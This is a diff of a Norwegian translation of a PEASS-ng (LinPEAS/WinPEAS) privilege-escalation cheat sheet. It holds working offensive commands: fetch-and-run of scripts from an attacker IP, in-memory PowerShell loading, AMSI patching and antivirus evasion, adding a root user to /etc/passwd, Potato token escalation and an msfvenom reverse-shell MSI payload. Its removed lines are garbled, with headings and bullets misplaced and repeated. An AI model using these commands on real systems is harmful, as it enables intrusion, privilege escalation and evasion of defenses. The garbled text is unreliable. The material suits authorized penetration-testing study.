@@ -1,12 +1,16 @@
-# 🦹 PEASS-ng – komplett hurtigreferanse
-
 <!-- language-home-navigation -->
-[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Komplett jukseark
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
@@ -16,72 +20,70 @@
   ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
              LinPEAS & WinPEAS Privilege Escalation Suite
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
   <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
   <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
-  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
+  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automatisert">
 </p>
 
 <p align="center">
-  <b>🔍 The world's most popular automated privilege escalation tools for Linux and Windows systems</b>
+  <b>> Verdens mest populære automatiserte rettighetsopptrappingsverktøy for Linux- og Windows-systemer</b>
 </p>
 
 ---
 
 ## 📋 Innholdsfortegnelse
 
-- [Introduksjon](#-introduction)
+– [Introduksjon](#-introduksjon)
 - [Color Legend & How to Read Output](#-color-legend--how-to-read-output)
-- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-escalation)
-  - [Download & In-Memory Execution](#download--in-memory-execution)
-  - [Alternativer og parametere](#command-line-options)
+- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-eskalering)
+  - [Nedlasting og kjøring i minne](#nedlasting--i-minne-kjøring)
+  - [Kommandolinjealternativer](#kommandolinjealternativer)
   - [Core Vectors Checked by LinPEAS](#core-vectors-checked-by-linpeas)
   - [Stealth & AV Evasion](#stealth--av-evasion)
-- [WinPEAS (Windows Privilege Escalation)](#-winpeas-windows-privilege-escalation)
-  - [Cleartext passwords in `.bash_history`, configuration files (`wp-config.php`, `.env`), SSH keys (`id_rsa`), and memory dumps.](#execution-methods-exe-vs-bat)
-  - [WinPEAS is provided in multiple formats:](#running-winpeas-in-memory)
-  - [Running WinPEAS in Memory](#core-vectors-checked-by-winpeas)
-  - [5. **Credential Stores & Autologon:](#bypassing-windows-defender--amsi)
-- [Interpreting High-Priority Findings](#-interpreting-high-priority-findings)
-- [Hurtigreferanse](#-quick-reference-table)
-- [Tips og beste praksis](#-tips--best-practices)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Ressurser og referanser](#-resources)
+- [WinPEAS (Windows Privilege Escalation)](#-winpeas-windows-privilege-eskalering)
+  - [Utførelsesmetoder (.exe vs .bat)](#execution-methods-exe-vs-bat)
+  - [Running WinPEAS in Memory](#running-winpeas-in-memory)
+  - [Core Vectors Checked by WinPEAS](#core-vectors-checked-by-winpeas)
+  - [Omgå Windows Defender og AMSI](#bypassing-windows-defender--amsi)
+- [Tolking av høyprioriterte funn](#-tolker-høyprioriterte funn)
+- [Hurtigreferansetabell](#-hurtigreferansetabell)
+– [Tips og beste fremgangsmåter](#-tips--beste praksis)
+– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
+- [Ressurser](#-ressurser)
 
 ---
 
 ## 🎯 Introduksjon
 
-**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - new generation), created by Carlos Polop, is the de-facto standard collection of automated auditing tools used to uncover privilege escalation vectors on compromised systems:
+**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - ny generasjon), skapt av Carlos Polop, er de-facto standardsamlingen av automatiserte revisjonsverktøy som brukes til å avdekke privilegieskaleringsvektorer på kompromitterte systemer:
 
-- **LinPEAS**: An all-in-one Bash script that searches for misconfigurations, credentials, writable files, SUID binaries, kernel exploits, cron jobs, and containers on Linux/Unix systems.
-- **WinPEAS**: Available as a standalone compiled .NET binary (`winPEASany.exe`, `winPEASx64.exe`) and lightweight batch script (`winPEAS.bat`) for auditing Windows workstations, domain members, and servers.
+- **LinPEAS:** Et alt-i-ett Bash-skript som søker etter feilkonfigurasjoner, legitimasjon, skrivbare filer, SUID-binærfiler, kjerneutnyttelser, cron-jobber og containere på Linux/Unix-systemer.
+- **WinPEAS:** Tilgjengelig som et frittstående kompilert .NET binært (`winPEASany.exe`, `winPEASx64.exe`) og lett batchskript (`winPEAS.bat`) for revisjon av Windows-arbeidsstasjoner, domenemedlemmer og servere.
 
 ---
 
-## 🎨 Color Legend & How to Read Output
+## 🎨 Fargeforklaring og hvordan du leser utdata
 
-The defining power of PEASS is its automated color rating system:
+Den definerende kraften til PEASS er dets automatiserte fargevurderingssystem:
 
-|Color|Significance|Meaning|
-|-------|--------------|---------|
-|🔴 **RED/YELLOW**|🚨 **CRITICAL (99% PrivEsc)**|Highly reliable privilege escalation vector. Must check immediately!|
-|🔴 **RED**|⚠️ **Interesting**|Unusual configuration, non-default setting, or credential candidate.|
-|🟡 **YELLOW**|ℹ️ **Informative**|Noticeable finding that might be part of an exploit chain.|
-|🔵 **CYAN / BLUE**|👥 **Context**|Users, groups, and standard system information.|
+| Farge | Betydning | Betydning |
+|-------|--------------|--------|
+| 🔴 **RØD/GUL** | 🚨 **KRITISK (99 % PrivEsc)** | Svært pålitelig privilegieeskaleringsvektor. Må sjekkes umiddelbart! |
+| 🔴 **RØD** | ⚠️ **Interessant** | Uvanlig konfigurasjon, ikke-standardinnstilling eller legitimasjonskandidat. |
+| 🟡 **GUL** | ℹ️ **Informativ** | Merkbare funn som kan være en del av en utnyttelseskjede. |
+| 🔵 **CYAN / BLÅ** | 👥 **Kontekst** | Brukere, grupper og standard systeminformasjon. |
 
-> **Golden Rule:** Scroll directly to **RED/YELLOW** highlights first! If you see text with a yellow background and red letters, an exploit vector is almost guaranteed.
+> **Gylden regel:** Bla direkte til **RØD/GUL** høydepunkter først! Hvis du ser tekst med gul bakgrunn og røde bokstaver, er en utnyttelsesvektor nesten garantert.
 
 ---
 
 ## 🐧 LinPEAS (Linux Privilege Escalation)
 
-### Download & In-Memory Execution
+### Nedlasting og kjøring i minnet
 
-You rarely need to write `linpeas.sh` to disk. Execute it directly in memory using standard UNIX utilities:
-
+Du trenger sjelden å skrive `linpeas.sh` til disk. Kjør den direkte i minnet ved å bruke standard UNIX-verktøy:
 ```bash
 # 1. From attacker Python web server directly into bash
 curl -L http://10.10.14.5:8000/linpeas.sh | sh
@@ -96,9 +98,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 ./linpeas.sh -a > /tmp/linpeas.txt
 less -r /tmp/linpeas.txt
 ```
-
-### Alternativer og parametere
-
+### Kommandolinjealternativer
 ```bash
 # Run all checks (including slower exhaustive searches)
 ./linpeas.sh -a
@@ -115,38 +115,36 @@ less -r /tmp/linpeas.txt
 # System information only
 ./linpeas.sh -s
 ```
+### Kjernevektorer sjekket av LinPEAS
 
-### Core Vectors Checked by LinPEAS
-
-1. **Sudo Misconfigurations (`sudo -l`):**
-   - Commands runnable as root without password (`NOPASSWD`).
-   - Sudo token reuse / CVE-2021-3156 (Baron Samedit).
-2. **SUID / SGID Binaries:**
-   - Core Vectors Checked by LinPEAS
-3. **Linux Capabilities:**
-   - 1. **Sudo Misconfigurations (`sudo -l`):
-4. **Scheduled Tasks & Timers:**
-   - Sudo token reuse / CVE-2021-3156 (Baron Samedit).
-   - 2. **SUID / SGID Binaries:
-5. **Path & Environment Hijacking:**
-   - 3. **Linux Capabilities:
-6. **Kernel Exploitation:**
-   - 4. **Scheduled Tasks & Timers:
+1. **Sudo feilkonfigurasjoner (`sudo -l`):**
+   - Kommandoer som kan kjøres som root uten passord (`NOPASSWD`).
+   - Sudo token gjenbruk / CVE-2021-3156 (Baron Samedit).
+2. **SUID / SGID-binærer:**
+   - Binærfiler med root-tillatelser (`chmod +s`). Kryssreferert mot **GTFOBins**.
+3. **Linux-funksjoner:**
+   - Binærfiler med forhøyede muligheter som `cap_setuid+ep` (f.eks. `python3`, `tar`, `perl`).
+4. **Planlagte oppgaver og tidtakere:**
+   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) og skrivbare planlagte skript.
+   - Systemd timer (`systemctl list-timers`).
+5. **Kapring av sti og miljø:**
+   - Skrivbare kataloger i `$PATH`, relative kommandooppslag i skript.
+6. **Kjerneutnyttelse:**
+   - Kjerneversjon sjekket mot kjente utnyttelser (Dirty COW, Dirty Pipe, OverlayFS).
 7. **NFS Root Squashing:**
-   - Systemd timers (`systemctl list-timers`).
-8. **Credential Harvesting:**
-   - Writable directories in `$PATH`, relative command lookups in scripts.
+   - Delte kataloger montert med `no_root_squash` i `/etc/exports`.
+8. **Innsamling av legitimasjon:**
+   - Klartekstpassord i `.bash_history`, konfigurasjonsfiler (`wp-config.php`, `.env`), SSH-nøkler (`id_rsa`) og minnedumper.
 
 ---
 
 ## 🪟 WinPEAS (Windows Privilege Escalation)
 
-### Cleartext passwords in `.bash_history`, configuration files (`wp-config.php`, `.env`), SSH keys (`id_rsa`), and memory dumps.
+### Utførelsesmetoder (.exe vs. .bat)
 
-WinPEAS is provided in multiple formats:
-- **`winPEASx64.exe` / `winPEASany.exe`**: Written in C#/.NET. Most comprehensive; performs deep registry, API, and credential checks.
-- **`winPEAS.bat`**: Plain batch script. Highly compatible with legacy Windows versions, requires no .NET dependencies, and evades certain static binary detections.
-
+WinPEAS leveres i flere formater:
+- **`winPEASx64.exe` / `winPEASany.exe`:** Skrevet i C#/.NET. Mest omfattende; utfører dype register-, API- og legitimasjonssjekker.
+- **`winPEAS.bat`:** Vanlig batchskript. Svært kompatibel med eldre Windows-versjoner, krever ingen .NET-avhengigheter og unngår visse statiske binære deteksjoner.
 ```cmd
 :: Run winPEAS binary with full color output
 winPEASx64.exe
@@ -157,39 +155,35 @@ winPEASx64.exe > C:\Windows\Temp\out.txt
 :: Fast check without heavy registry and file searches
 winPEASx64.exe quiet
 ```
+### Kjører WinPEAS i minnet
 
-### WinPEAS is provided in multiple formats:
-
-To avoid saving files to disk on audited workstations, load WinPEAS directly into PowerShell memory:
-
+For å unngå å lagre filer på disk på reviderte arbeidsstasjoner, last inn WinPEAS direkte i PowerShell-minnet:
 ```powershell
 # In-memory execution using Net.WebClient
 $pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
 [System.Reflection.Assembly]::Load($pe)
 [winPEAS.Program]::Main("")
 ```
+### Kjernevektorer sjekket av WinPEAS
 
-### Running WinPEAS in Memory
-
-1. **Service Permissions & Unquoted Paths:**
-   - **Unquoted Service Paths**: Service binary paths with spaces and no quotes (`C:\Program Files\App\service.exe` -> attacker places `C:\Program.exe`).
-   - **Weak Service Permissions**: Non-admin users having `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`.
-2. **DLL Hijacking:**
-   - Core Vectors Checked by WinPEAS
+1. **Tjenestetillatelser og unoterte baner:**
+   - **Unoterte tjenestebaner:** Tjener binære baner med mellomrom og ingen anførselstegn (`C:\Program Files\App\service.exe` -> angriper plasserer `C:\Program.exe`).
+   - **Svake tjenestetillatelser:** Ikke-administratorbrukere som har `SERVICE_ALL_ACCESS` eller `SERVICE_CHANGE_CONFIG`.
+2. **DLL-kapring:**
+   - Tjenester som forsøker å laste inn ikke-eksisterende DLL-er fra brukerskrivbare kataloger.
 3. **AlwaysInstallElevated:**
-   - 1. **Service Permissions & Unquoted Paths:
-4. **Token Privileges (SeImpersonate / SeAssignPrimaryToken):**
-   - Exploitable via Potato exploits (SweetPotato, GodPotato, PrintSpoofer) to elevate from service accounts (`IIS APPPOOL`, `LOCAL SERVICE`) to `NT AUTHORITY\SYSTEM`.
-5. **Credential Stores & Autologon:**
-   - Services attempting to load non-existent DLLs from user-writable directories.
-   - 3. **AlwaysInstallElevated:
-6. **SAM & SYSTEM Backup Files:**
-   - 4. **Token Privileges (SeImpersonate / SeAssignPrimaryToken):
+   - Registernøkler `AlwaysInstallElevated = 1` som lar enhver bruker installere forhøyede MSI-pakker med `msiexec`.
+4. **Tokenprivilegier (SeImpersonate / SeAssignPrimaryToken):**
+   - Kan utnyttes via Potato-utnyttelse (SweetPotato, GodPotato, PrintSpoofer) for å heve fra tjenestekontoer (`IIS APPPOOL`, `LOCAL SERVICE`) til `NT AUTHORITY\SYSTEM`.
+5. **Legitimasjonsbutikker og autologon:**
+   - Klartekstpassord i registeret (`DefaultPassword` i Winlogon).
+   - Lagrede RDP-tilkoblinger, Vault-legitimasjon, DPAPI-blobber, PuTTY-økter, WiFi-passord.
+6. **SAM & SYSTEM Backup-filer:**
+   - Skrivbare eller lesbare kopier av `C:\Windows\Repair\SAM` eller `C:\Windows\System32\config\RegBack\SAM`.
 
-### 5. **Credential Stores & Autologon:
+### Omgå Windows Defender og AMSI
 
-Saved RDP connections, Vault credentials, DPAPI blobs, PuTTY sessions, WiFi passwords.
-
+Windows Defender flagger aktivt kompilerte versjoner av `winPEASx64.exe`. For å kjøre WinPEAS i overvåkede miljøer:
 ```powershell
 # 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
 # 2. Patch AMSI in PowerShell session before running in memory:
@@ -198,13 +192,12 @@ Saved RDP connections, Vault credentials, DPAPI blobs, PuTTY sessions, WiFi pass
 # 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
 curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
 ```
-
 ---
 
-## 🎯 Interpreting High-Priority Findings
+## 🎯 Tolking av høyprioriterte funn
 
-### 1. LinPEAS: Writable `/etc/passwd`
-If LinPEAS marks `/etc/passwd` in **RED/YELLOW**:
+### 1. LinPEAS: Skrivbar `/etc/passwd`
+Hvis LinPEAS merker `/etc/passwd` i **RØD/GUL**:
 ```bash
 # Generate password hash:
 openssl passwd -1 -salt evil SaltPass123
@@ -212,57 +205,54 @@ openssl passwd -1 -salt evil SaltPass123
 echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
 su root2
 ```
-
-### 🎯 Interpreting High-Priority Findings
-If you hold `SeImpersonatePrivilege`:
+### 2. WinPEAS: `SeImpersonatePrivilege` Present
+Hvis du holder `SeImpersonatePrivilege`:
 ```powershell
 # Elevate instantly using GodPotato or PrintSpoofer:
 .\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
 ```
-
-### 3. WinPEAS: `AlwaysInstallElevated` Set to 1
+### 3. WinPEAS: `AlwaysInstallElevated` Sett til 1
 ```powershell
 # Generate malicious MSI payload:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
 # Run installer as low-privileged user:
 msiexec /quiet /qn /i priv.msi
 ```
+---
+
+## 📊 Hurtigreferansetabell
+
+| Mål | Kommando | Formål |
+|--------|--------|--------|
+| **Linux (fjernkontroll)** | `curl -L http://<IP>/linpeas.sh \| sh` | Utførelse i minnet uten å berøre disk |
+| **Linux (lokal)** | `./linpeas.sh -a > out.txt` | Fullstendig revisjon lagret i tekstfil |
+| **Linux (Rask)** | `./linpeas.sh -q` | Rask skanning hopper over langsomme filsøk |
+| **Windows (CLI)** | `winPEASx64.exe quiet` | Rask utførelse med redusert støy |
+| **Windows (minne)**| `[System.Reflection.Assembly]::Load($pe)` | Last inn binær .NET i minnet via PowerShell |
+| **Windows (Batch)** | `winPEAS.bat` | Avhengighetsfri utførelse for legacy/AV-unndragelse |
 
 ---
 
-## 📊 Hurtigreferanse
+## 💡 Tips og beste fremgangsmåter
 
-|Target|Kommando|Formål|
-|--------|---------|---------|
-|**Linux (Remote)**|`curl -L http://<IP>/linpeas.sh \|sh`|In-memory execution without touching disk|
-|**Linux (Local)**|`./linpeas.sh -a > out.txt`|Complete audit saved to text file|
-|**Linux (Fast)**|`./linpeas.sh -q`|Fast scan skipping slow file searches|
-|**Windows (CLI)**|`winPEASx64.exe quiet`|Fast execution with reduced noise|
-|**Windows (Memory)**|`[System.Reflection.Assembly]::Load($pe)`|Load .NET binary in memory via PowerShell|
-|**Windows (Batch)**|`winPEAS.bat`|Dependency-free execution for legacy/AV evasion|
+1. **Se gjennom utdata ved å bruke `less -r`:**
+   Når du omdirigerer utdata til en fil (`./linpeas.sh > linpeas.txt`), må du alltid se den med `less -r linpeas.txt` eller `cat linpeas.txt` slik at terminale ANSI-fargeescape-koder gjengis riktig.
+2. **Overføring via port 80/443:**
+   Når du setter LinPEAS eller WinPEAS på angriperboksen din, vert webserveren din på port `80` eller `443` ved å bruke `python3 -m http.server 80` for å omgå strenge regler for utgang av målbrannmur.
+3. **Ikke overse skjult legitimasjon:**
+   Sjekk delene "Interessante filer" og "Cloud Credentials" i LinPEAS-utdata; ofte gir ren tekst API-tokens eller AWS-legitimasjon høyere privilegier enn en lokal utnyttelse.
 
 ---
 
-## 💡 Tips og beste praksis
+## ⚠️ Juridisk ansvarsfraskrivelse
 
-1. **Review Output Using `less -r`:**
-   When redirecting output to a file (`./linpeas.sh > linpeas.txt`), always view it using `less -r linpeas.txt` or `cat linpeas.txt` so terminal ANSI color escape codes render properly.
-2. **Transfer via Port 80/443:**
-   When staging LinPEAS or WinPEAS on your attacker box, host your web server on port `80` or `443` using `python3 -m http.server 80` to bypass strict target firewall egress rules.
-3. **Don't Overlook Hidden Credentials:**
-   Check the "Interesting Files" and "Cloud Credentials" sections of LinPEAS output; often plain-text API tokens or AWS credentials grant higher privileges than a local exploit.
+> **VIKTIG:** PEASS-ng-skript utfører omfattende intern revisjon og konfigurasjonsoppdagelse. De må kun utføres på systemer der du har dokumentert tillatelse under autoriserte penetrasjonstester, CTF-øvelser eller interne sikkerhetsrevisjoner.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## 📚 Ressurser
 
-> **IMPORTANT:** PEASS-ng scripts perform comprehensive internal auditing and configuration discovery. They must only be executed on systems where you have documented permission during authorized penetration tests, CTF exercises, or internal security audits.
-
----
-
-## 📚 Ressurser og referanser
-
-- [PEASS-ng Official GitHub Repository](https://github.com/carlospolop/PEASS-ng)
+- [PEASS-ng offisielle GitHub-lager](https://github.com/carlospolop/PEASS-ng)
 - [HackTricks Cloud & Privilege Escalation Bible](https://book.hacktricks.xyz/)
 - [GTFOBins - Unix Binaries Exploitation](https://gtfobins.github.io/)
 - [LOLBAS - Windows Living Off The Land](https://lolbas-project.github.io/)
